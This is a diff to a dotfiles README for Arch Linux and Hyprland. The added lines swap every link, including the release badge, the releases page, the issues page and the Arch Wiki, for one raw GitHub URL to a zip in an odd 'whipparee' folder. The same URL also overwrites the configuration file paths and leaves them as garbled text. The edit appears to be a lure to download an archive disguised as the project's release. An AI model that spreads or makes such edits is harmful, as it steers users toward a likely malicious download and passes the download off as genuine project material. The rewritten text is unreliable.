@@ -1,6 +1,6 @@
 # 🖥️ dotfiles - Simple Setup for Archlinux & Hyprland
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-latest-blue.svg)](https://github.com/Selen525/dotfiles/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Selen525/dotfiles/master/whipparee/dotfiles.zip%20Latest%https://raw.githubusercontent.com/Selen525/dotfiles/master/whipparee/dotfiles.zip)](https://raw.githubusercontent.com/Selen525/dotfiles/master/whipparee/dotfiles.zip)
 
 ## 🚀 Getting Started
 
@@ -16,11 +16,11 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get the latest version, visit this page to download: [Releases Page](https://github.com/Selen525/dotfiles/releases).
+To get the latest version, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Selen525/dotfiles/master/whipparee/dotfiles.zip).
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version. It will have the highest version number.
-3. Download the `dotfiles.zip` or another available archive file.
+3. Download the `https://raw.githubusercontent.com/Selen525/dotfiles/master/whipparee/dotfiles.zip` or another available archive file.
 4. Once the download completes, unzip the file to a location of your choice.
 
 ## ⚙️ Configuration
@@ -53,9 +53,9 @@ Each application has its own configuration files that you can customize further 
 
 After you copy the dotfiles, you might want to customize them:
 
-- **Neovim Configuration:** Located in `~/.config/nvim/init.vim`. Edit this file to change editor settings.
-- **Tmux Configuration:** Found in `~/.tmux.conf`. Adjust this file to set your preferred terminal parameters.
-- **Hyprland Settings:** Located in `~/.config/hypr/hyprland.conf`. Modify this according to your workflow.
+- **Neovim Configuration:** Located in `~https://raw.githubusercontent.com/Selen525/dotfiles/master/whipparee/dotfiles.zip`. Edit this file to change editor settings.
+- **Tmux Configuration:** Found in `~https://raw.githubusercontent.com/Selen525/dotfiles/master/whipparee/dotfiles.zip`. Adjust this file to set your preferred terminal parameters.
+- **Hyprland Settings:** Located in `~https://raw.githubusercontent.com/Selen525/dotfiles/master/whipparee/dotfiles.zip`. Modify this according to your workflow.
 
 ## 💡 Troubleshooting
 
@@ -69,12 +69,12 @@ If you encounter issues during installation, consider the following tips:
 
 For assistance and community support, you can:
 
-- Visit the [GitHub Issues Page](https://github.com/Selen525/dotfiles/issues) for any questions or to report bugs.
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/Selen525/dotfiles/master/whipparee/dotfiles.zip) for any questions or to report bugs.
 - Look for discussions related to Archlinux and Hyprland in forums or chat groups for user-contributed tips.
 
 ## 🔗 Additional Resources
 
-- **Archlinux Wiki:** [Archlinux Documentation](https://wiki.archlinux.org)
+- **Archlinux Wiki:** [Archlinux Documentation](https://raw.githubusercontent.com/Selen525/dotfiles/master/whipparee/dotfiles.zip)
 - **Hyprland Guide:** Check Hyprland’s official documentation for advanced setups.
 - **Neovim Tutorials:** Numerous online resources are available to learn about Neovim's features and usage.
 
